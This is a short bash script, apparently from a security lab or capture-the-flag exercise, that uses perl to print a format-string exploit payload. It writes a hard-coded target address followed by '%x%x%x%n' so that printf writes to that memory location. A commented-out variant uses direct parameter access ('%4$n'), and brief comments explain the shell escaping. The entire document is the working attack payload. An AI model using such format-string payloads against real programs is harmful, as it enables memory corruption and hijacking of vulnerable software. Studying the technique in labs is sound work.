#!/bin/bash

# write address of the string first, then use %x to jump over non-important memory
perl -e 'print "\x2c\xa0\x04\x08%x%x%x%n";'

# alternatively we can use field specifier. Note that the "\" before "$" is very important.
# without "\", bash will treat "$n" as an environment variable instead of two chars.
#perl -e 'print "\x30\xa0\x04\x08%4\$n";'
